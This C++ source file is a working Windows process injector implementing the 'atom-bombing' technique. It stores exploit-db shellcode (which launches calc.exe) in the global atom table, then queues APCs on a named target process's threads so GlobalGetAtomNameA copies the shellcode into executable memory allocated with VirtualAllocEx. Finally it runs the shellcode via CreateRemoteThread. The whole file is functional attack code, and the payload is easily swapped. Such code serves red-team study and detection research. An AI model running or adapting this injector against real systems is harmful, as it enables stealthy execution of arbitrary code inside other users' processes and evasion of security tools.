/**
* Injects a shellcode payload a process using an APC to call GlobalGetAtomNameA in the remote process (atom-bombing).
* The shellcode can then be executed using any execution primitive. We use CreateRemoteThread here because its the most convinient.
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- atleast one thread must be in alertable state at some point
*/

#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

#ifdef _WIN64
// https://www.exploit-db.com/shellcodes/49819
// added infinity loop so the remote thread doesnt crash "\xeb\xfe\
// added null terminator required for GlobalAddAtomA "x00" 
unsigned char popCalcNullTerminated[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6\xeb\xfe\x00";
#else
// https://www.exploit-db.com/shellcodes/48116
// removed ExitProcess call at the end
// added infinity loop so the remote thread doesnt crash "\xeb\xfe\
// added null terminator required for GlobalAddAtomA "x00"
char popCalcNullTerminated[] =
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\xeb\xfe\x00";
#endif

typedef VOID(*PPS_APC_ROUTINE)(
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);

using fnNtQueueApcThread = NTSTATUS(NTAPI*)(
	_In_ HANDLE ThreadHandle,
	_In_ PPS_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);

int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	HMODULE ntdllHandle = GetModuleHandle("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Error] %d - Failed to acquire ntdll handle\n", GetLastError());
		return 1;
	}

	fnNtQueueApcThread NtQueueApcThread = (fnNtQueueApcThread)GetProcAddress(ntdllHandle, "NtQueueApcThread");
	if (!NtQueueApcThread)
	{
		printf("[Error] %d - Failed to resolve NtQueueApcThread in ntdll\n", GetLastError());
		return 1;
	}

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// allocate remote memory
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	// user32dll needs to be loaded for GlobalAddAtomA to work.. 
	LoadLibrary("User32.dll");

	ATOM shellcodeAtom = GlobalAddAtomA((char*)popCalcNullTerminated);
	if (!shellcodeAtom)
	{
		printf("[Error] %d - Failed to GlobalAddAtomA\n", GetLastError());
		return 1;
	}

	// iterate over target processes threads and inject APC into each of them
	// this increases the chance of the shellcode being executed since only one of the thread needs to reach an alertable state
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] %d - Failed to acquire thread handle\n", GetLastError());
				continue;
			}
			NtQueueApcThread(threadHandle, (PPS_APC_ROUTINE)GlobalGetAtomNameA, (PVOID)shellcodeAtom, remoteMemory, (PVOID)(sizeof(popCalcNullTerminated)));
			printf("[Info] - Queued APC for thread %d\n", currentThreadEntry.th32ThreadID);
			CloseHandle(threadHandle);
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));

	// check if a thread wrote the payload. There are also other methods such as Sleep(X) and hope for the best.
	int remotePayloadBuffer;
	do
	{
		ReadProcessMemory(targetProcessHandle, remoteMemory, &remotePayloadBuffer, sizeof(int), nullptr);
		Sleep(100);
	} while (remotePayloadBuffer == 0);
	
	// create a remote thread to execute. We could also use other techniques such as thread hijacking
	HANDLE hThread = CreateRemoteThread(targetProcessHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteMemory), nullptr, 0, nullptr);
	if (!hThread)
	{
		printf("[Error] %d - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	return 0;
}